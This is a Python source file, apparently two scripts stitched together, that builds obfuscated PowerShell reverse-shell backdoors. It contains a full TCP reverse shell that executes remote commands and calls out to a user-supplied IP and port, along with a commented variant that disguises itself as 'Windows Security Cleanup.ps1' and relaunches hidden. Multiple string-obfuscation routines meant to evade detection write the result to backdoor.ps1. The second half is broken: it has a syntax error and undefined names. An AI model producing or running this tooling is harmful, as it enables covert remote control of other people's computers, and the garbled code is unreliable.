import re
import string as s
import os
import random as r


#cont = r'''$III = $(& (\Join-Path\) $(& (\Invoke-Expression\) (\echo $env:TMP\)) -ChildPath $(& (\Invoke-Expression\) (\echo "Windows Security Cleanup.ps1"\))); $JJJ = $($(& (\echo\) $PSCommandPath)); $KKK = $(& (\Join-Path\) $(& (\Invoke-Expression\) (\echo $env:TMP\)) $(& (\Invoke-Expression\) (\echo "mat-debug-4218964.log"\))); $LLL = $($III -eq $JJJ); if (($LLL) -eq $False) {; (& (\Invoke-Expression\) (\Copy-Item -Path $JJJ -Destination $III\)); (& (\echo\) $JJJ > $KKK); (& (\Invoke-Expression\) (\Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$III`"" -WindowStyle Hidden\)); Exit; }; if ($LLL) {; (& (\Invoke-Expression\) (\Start-Sleep -Seconds 3\)); (& (\Invoke-Expression\) (\Remove-Item -Path $(cat $KKK) -Force\)); (& (\Invoke-Expression\) (\Remove-Item -Path $KKK -Force\)); }; $AAA = (& (\New-Object\) (\System.Net.Sockets.TCPClient\)(((IPADDR), (PORT)))); $BBB = $AAA.(\GetStream\)(); [byte[]]$CCC = (& (\New-Object\) Byte[] 65536); while (($DDD = $BBB.(\Read\)($CCC, 0, $CCC.Length)) -ne 0) {; $EEE = [System.Text.Encoding]::ASCII.GetString($CCC, 0, $DDD); $FFF = (& (\Invoke-Expression\) $EEE 2>&1) | & (\Out-String\); $GGG = $FFF + $(& (\Invoke-Expression\) (\[Environment]::UserName\))+'@'+$(& (\Invoke-Expression\) (\[System.Net.Dns]::GetHostName()\))+' ['+$(& (\Get-Location\))+']~$ '; $HHH = ([text.encoding]::ASCII.(\GetBytes\)($GGG)); $BBB.(\Write\)($HHH, 0, $HHH.(\Length\));$BBB.(\Flush\)(); }; $AAA.(\Close\)()'''
cont = r'''$AAA = (& (\New-Object\) (\System.Net.Sockets.TCPClient\)(((IPADDR), (PORT))));$BBB = $AAA.(\GetStream\)();[byte[]]$CCC = (& (\New-Object\) Byte[] 65536);while (($DDD = $BBB.(\Read\)($CCC, 0, $CCC.Length)) -ne 0) {$EEE = [System.Text.Encoding]::ASCII.GetString($CCC, 0, $DDD);$FFF = (& (\Invoke-Expression\) $EEE 2>&1) | & (\Out-String\);$GGG = $FFF + $(& (\Invoke-Expression\) (\[Environment]::UserName\))+'@'+$(& (\Invoke-Expression\) (\[System.Net.Dns]::GetHostName()\))+' ['+$(& (\Get-Location\))+']~$ ';$HHH = ([text.encoding]::ASCII.(\GetBytes\)($GGG));$BBB.(\Write\)($HHH, 0, $HHH.(\Length\));$BBB.(\Flush\)()};$AAA.(\Close\)()'''

# SET IP AND PORT
ip = '\\' + input("Enter IP: ") + '\\'
port = '\\' + input("Enter port: ") + '\\'

cont = cont.replace("IPADDR", ip)
cont = cont.replace("PORT", port)

# REPLACE VARIABLES
letters = [letter * 3 for letter in string.ascii_uppercase[0:13]]
random = [''.join(random.choices(string.ascii_letters, k=random.randint(1, 17))) for _ in range(len(letters))]
to = dict(zip(letters, random))

pat = [re.escape(p) for p in letters]
pat = re.compile('|'.join(pat))
cont = pat.sub(lambda match: to[match.group(0)], cont)


# REPLACE OBVIOUS METHOD CALLS
pat = r'\\.+?\\'


# ALL PARTS
def values_to_chars():
    global cont
    cont = re.sub(pat, lambda m: "([string]::join('', ( (" + ','.join(str(ord(c)) for c in m.group(0)[1:-1]) + r") |%{$_}|%{ ([char][int] $_)})) |%{$_}| % {$_})", cont, count=1)

def char_math(match):
    global cont
    parts = []
    for c in match.group(0)[1:-1]:
        rnd = random.randint(1, 99)
        operation = "+" if random.choice([True, False]) else "*"
        compliment = "-" if operation == "+" else "/"
        if operation == "+":
            part = f"([char]({rnd}{operation}{str(ord(c))}{compliment}{rnd})" + r" |%{$_}| % {$_} |%{$_})"
        else:
            part = f"([char]({rnd}{operation}{str(ord(c))}{compliment}{rnd})" + r" |%{$_})"
        parts.append(part)
    return '+'.join(parts)

def rand_string_index(match):
    global cont
    matched_string = match.group(0)[1:-1]
    char_positions = [''] * 200
    indices_used = []
    for char in matched_string:
        index = random.choice([i for i in range(200) if char_positions[i] == ''])
        char_positions[index] = char
        indices_used.append(index)
    for i in range(len(char_positions)):
        if char_positions[i] == '':
            char_positions[i] = random.choice(string.ascii_letters + string.digits)
    embedded_string = ''.join(char_positions)
    extraction_logic = "('" + embedded_string + "'[" + ','.join(map(str, indices_used)) + "] -join '')"
    return extraction_logic

# AFTER THIS, IT GETS STICKY, SO ONE PIECE PER PART
def part_to_char(c):
    return r"([string]::join('', ( (" + str(ord(c)) +  r") |%{$_}|%{ ([char][int] $_)})) |%{$_}| % {$_})"

def part_math(c):
    parts = ''
    rnd = random.randint(1, 99) 
    operation = "+" if random.choice([True, False]) else "*"
    compliment = "-" if operation == "+" else "/"
    if operation == "+":
        return f"([char]({rnd}{operation}{str(ord(c))}{compliment}{rnd})" + r")"
    else:
        return  f"([char]({rnd}{operation}{str(ord(c))}{compliment}{rnd})" + r")"

def rand_part_index(c):
    char_positions = [''] * 50
    indices_used = []
    index = random.choice([i for i in range(50) if char_positions[i] == ''])
    char_positions[index] = c
    indices_used.append(index)
    for i in range(len(char_positions)):
        if char_positions[i] == '':
            char_positions[i] = random.choice(string.ascii_letters + string.digits)
    embedded_string = ''.join(char_positions)
    return "('" + embedded_string + "'[" + ','.join(map(str, indices_used)) + "] -join '')"
     

env = [
	"ALLUSERSPROFILE",
	"CommonProgramFiles",
	"ComSpec",
	"ProgramData",
	"ProgramFiles",
	"ProgramW6432",
	"PSModulePath",
	"PUBLIC",
	"SystemDrive",
	"SystemRoot",
	"windir"
]

envMap = {}

for c in string.printable:
    envMap[c] = {}
    for v in env:
        val = os.getenv(v)
        if c in val:
            envMap[c][v] = []
            for i,t in enumerate(val):
                if c == t:
                    envMap[c][v].append(i)
                    
def env_hide(match):
    input_string = match.group(0)[1:-1]
    hidden_strings = []
    for c in input_string:
        if c in envMap and envMap[c]:
            pVars = list(envMap[c].keys())
            cVar = random.choice(pVars)
            pIndex = envMap[c][cVar]
            cIndex = random.choice(pIndex)
            hidden_strings.append(f"$env:{cVar}[{cIndex}]")
        else:
            rand = random.randint(1, 3)
            if rand == 1:
                hidden_strings.append(part_to_char(c))
            elif rand == 2:
                hidden_strings.append(part_math(c))
            else:
                hidden_strings.append(rand_part_index(c))
    return "+".join(hidden_strings)

def replace(rand):
    global cont
    if rand == 1:
        values_to_chars()
    elif rand == 2:
        cont = re.sub(pat, lambda m: char_math(m), cont, count=1)
    elif rand == 3:
        cont = re.sub(pat, lambda m: rand_string_index(m), cont, count=1)
    elif rand == 4:
        cont = re.sub(pat, lambda m: env_hide(m), cont, count=1)

# FOR EVERY INSTANCE OF // CHOOSE RANDOM OBF METHOD
for i in range(0,48):
    rand = random.randint(1, 4)
    replace(rand)
    
def script_to_char(s):
    return "([string]::join('',((" + ','.join(str(ord(c)) for c in s) + r")|%{[char]$_})))|invoke-expression"
       
# WRITE NEW CODE TO FILE
with open('backdoor.ps1', 'w') as c:
    c.write(script_to_char(cont))
print("Check files for backdoor.ps1")

import re
import random
import string

# PAYLOAD AND PATTERN
reverse_shell = """$ReverseShellConnection = (& (/New-Object/) (/System.Net.Sockets.TCPClient/)(((IP_ADDRESS), (PORT))));$NetworkStream = $ReverseShellConnection.(/GetStream/)();$ReadBuffer = (& (/New-Object/) Byte[] 65536);while (($BytesRead = $NetworkStream.(/Read/)($ReadBuffer, 0, $ReadBuffer.Length)) -ne 0) {;$CommandOutput = [System.Text.Encoding]::ASCII.GetString($ReadBuffer, 0, $BytesRead);$ExecutedOutput = (& (/Invoke-Expression/) $CommandOutput 2>&1) | & (/Out-String/);$PromptWithOutput = $ExecutedOutput + 'PS >';$OutputBytes = ([text.encoding]::ASCII.(/GetBytes/)($PromptWithOutput));$NetworkStream.(/Write/)($OutputBytes, 0, $OutputBytes.(/Length/));$NetworkStream.(/Flush/)();}$ReverseShellConnection.(/Close/)()"""

pattern = r"/.+?/"

# REPLACE IP/PORT
ip_address = input("Enter IP: ")
port = input("Enter port: ")
reverse_shell = reverse_shell.replace("IP_ADDRESS", ip_address)
reverse_shell = reverse_shell.replace("PORT", port)

# REPLACE VARIABLES
variables_2_replace = ["ReverseShellConnection",
                       "NetworkStream",
                       "ReadBuffer",
                       "BytesRead",
                       "CommandOutput",
                       "ExecutedOutput",
                       "PromptWithOutput",
                       "OutputBytes"]

for variable in variables_2_replace:
    random_string = ''.join(random.choices(string.ascii_letters, k=random.randint(1, 20)))
    reverse_shell = reverse_shell.replace(variable, random_string)

# METHOD 1
def list_2_character_2_string(object):
    command = match.group(0)[1:-1]
    return r"([string]::join('', ( (" + str(ord(command)) +  r") |%{$_}|%{ ([char][int] $_)})) |%{$_}| % {$_})"

# METHOD 2
def character_2_string(object):
    command = match.group(0)[1:-1]
    return "+".join("[char]("+str(ord(c))+")" for c in command)

# METHOD 3
def random_string_2_string(object):
    command = match.group(0)[1:-1]
    char_positions = [''] * 150
    indices_used = []
    
    for character in command:
        index = random.choice([i for i in range(150) if char_positions[i] == ''])
        char_positions[index] = character
        indices_used.append(index)
        
    for i in range(len(char_positions)):
        if char_positions[i] == '':
            char_positions[i] = random.choice(string.ascii_letters + string.digits)
            
    return "'" + ''.join(char_positions) + "'[" + ','.join(map(str, indices_used)) + "] -join ''"

# METHOD 4
env = [
	"ALLUSERSPROFILE",
	"CommonProgramFiles",
	"ComSpec",
	"ProgramData",
	"ProgramFiles",
	"ProgramW6432",
	"PSModulePath",
	"PUBLIC",
	"SystemDrive",
	"SystemRoot",
	"windir"
]

envMap = {}

for c in string.printable:
    envMap[c] = {}
    for v in env:
        val = os.getenv(v)
        if c in val:
            envMap[c][v] = []
            for i,t in enumerate(val):
                if c == t:
                    envMap[c][v].append(i)
                    
def env_hide(object):
    if object
    input_string = object.group(0)[1:-1]
    hidden_strings = []
    for c in input_string:
        if c in envMap and envMap[c]:
            pVars = list(envMap[c].keys())
            cVar = random.choice(pVars)
            pIndex = envMap[c][cVar]
            cIndex = random.choice(pIndex)
            hidden_strings.append(f"$env:{cVar}[{cIndex}]")
        else:
            rand = random.randint(1, 3)
            if rand == 1:
                hidden_strings.append(part_to_char(c))
            elif rand == 2:
                hidden_strings.append(part_math(c))
            else:
                hidden_strings.append(rand_part_index(c))
    return "+".join(hidden_strings)

# REPLACE EACH MATCH WITH RANDOM METHOD
for match in range(int(reverse_shell.count("/")/2)):
    reverse_shell = re.sub(pattern,
                           lambda m: random.choice([list_2_character_2_string,
                                                    character_2_string,
                                                    random_string_2_string])(m),
                           reverse_shell,
                           count=1)

# WRITE TO FILE
print(reverse_shell)
